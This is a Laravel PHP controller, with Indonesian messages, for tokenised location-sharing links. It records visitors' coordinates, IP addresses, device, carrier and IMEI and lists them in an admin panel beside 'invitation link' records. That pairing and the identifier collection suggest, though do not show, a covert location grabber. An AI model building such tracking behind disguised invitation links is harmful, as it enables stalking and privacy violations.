<?php

namespace App\Http\Controllers;

use App\Models\LocationUpdate;
use App\Models\TrackingLink;
use App\Models\LinkUndangan;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Str;

class TrackingController extends Controller
{
    public function index()
    {
        $trackingLinks = TrackingLink::with(['latestUpdate', 'updates' => function ($query) {
            $query->orderByDesc('created_at');
        }])
        ->withCount('updates')
        ->orderByDesc('created_at')
        ->get();

        $linkUndangans = LinkUndangan::all();

        return view('panel', compact('trackingLinks', 'linkUndangans'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => ['nullable', 'string', 'max:120'],
        ]);

        $token = $this->generateToken();

        $trackingLink = TrackingLink::create([
            'token' => $token,
            'name' => $request->name,
        ]);

        return Redirect::route('share.panel')
            ->with('success', 'Tautan berbagi lokasi berhasil dibuat.')
            ->with('new_link', url('/share/' . $trackingLink->token));
    }

    public function show(string $token)
    {
        $trackingLink = TrackingLink::where('token', $token)->firstOrFail();
        $linkUndangan = LinkUndangan::where('link_undangan', url('/share/' . $token))->first();
        return view('track', compact('trackingLink', 'linkUndangan'));
    }

    public function update(Request $request, string $token)
    {
        $trackingLink = TrackingLink::where('token', $token)->firstOrFail();

        $data = $request->validate([
            'latitude' => ['required', 'numeric'],
            'longitude' => ['required', 'numeric'],
            'device' => ['nullable', 'string', 'max:255'],
            'user_agent' => ['nullable', 'string'],
            'operator' => ['nullable', 'string', 'max:255'],
            'public_ip' => ['nullable', 'string', 'max:45'],
            'imei' => ['nullable', 'string', 'max:255'],
        ]);

        $locationUpdate = LocationUpdate::create([
            'tracking_link_id' => $trackingLink->id,
            'latitude' => $data['latitude'],
            'longitude' => $data['longitude'],
            'device' => $data['device'] ?? 'Unknown device',
            'user_agent' => $data['user_agent'] ?? $request->userAgent(),
            'ip_address' => $request->ip(),
            'public_ip' => $data['public_ip'] ?? null,
            'operator' => $data['operator'] ?? null,
            'imei' => $data['imei'] ?? null,
        ]);

        return response()->json([
            'status' => 'success',
            'message' => 'Lokasi berhasil dikirim.',
            'latitude' => $locationUpdate->latitude,
            'longitude' => $locationUpdate->longitude,
            'map_url' => 'https://maps.google.com/?q=' . $locationUpdate->latitude . ',' . $locationUpdate->longitude,
            'device' => $locationUpdate->device,
            'operator' => $locationUpdate->operator,
            'user_agent' => $locationUpdate->user_agent,
            'ip_address' => $locationUpdate->ip_address,
            'public_ip' => $locationUpdate->public_ip,
            'imei' => $locationUpdate->imei,
            'sent_at' => $locationUpdate->created_at->toDateTimeString(),
        ]);
    }

    public function destroy(string $token)
    {
        $trackingLink = TrackingLink::where('token', $token)->first();

        if (! $trackingLink) {
            return Redirect::route('share.panel')->with('error', 'Tautan tidak ditemukan atau sudah dihapus.');
        }

        $trackingLink->delete();

        return Redirect::route('share.panel')->with('success', 'Tautan berbagi telah dihapus.');
    }

    public function redirectUpdateGet(string $token)
    {
        return Redirect::route('share.show', ['token' => $token]);
    }

    protected function generateToken(): string
    {
        do {
            $token = Str::lower(Str::random(20));
        } while (TrackingLink::where('token', $token)->exists());

        return $token;
    }
}
